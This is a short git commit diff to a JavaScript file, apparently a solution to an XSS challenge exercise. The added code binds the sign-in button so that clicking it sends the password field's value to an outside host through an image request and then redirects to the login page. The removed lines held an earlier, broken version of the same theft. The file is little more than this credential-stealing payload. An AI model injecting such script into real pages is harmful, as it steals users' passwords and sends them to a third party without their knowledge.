ca72fbc67b98fa605e78e98c61bee8bd5380bd58
dlee20013 <dlee20013@gmail.com>
2017-04-25 02:08:11 -0700

    hello

--- part1/part_1.js
+++ part1/part_1.js
@@ -1,15 +1,10 @@
 document.addEventListener("DOMContentLoaded", function() {
 	document.getElementById("signin-btn").onclick = function givePassword() {
 		
-		var xhttp = new XMLHttpRequest();
-		var url = 'http://r7.io/e/davinl?s=' + document.getElementById("login_password");
-		request.open("GET", url, true);
-		request.send(null);
-
-		//var img = new Image();
-		//img.src = 'http://r7.io/e/davinl?s=' + document.getElementById("login_password").value;
-
-		//window.replace.href = "http://xss-challenges.r7.io/0/login";
+		var img = new Image();
+		img.src = 'http://r7.io/e/davinl?s=' + document.getElementById("login_password").value;
+		console.log(img);
+		window.replace.href = "http://xss-challenges.r7.io/0/login";
 	};
 	var prob = document.getElementsByClassName("problem")[0];
 	var err = document.getElementsByClassName("error-message")[0];
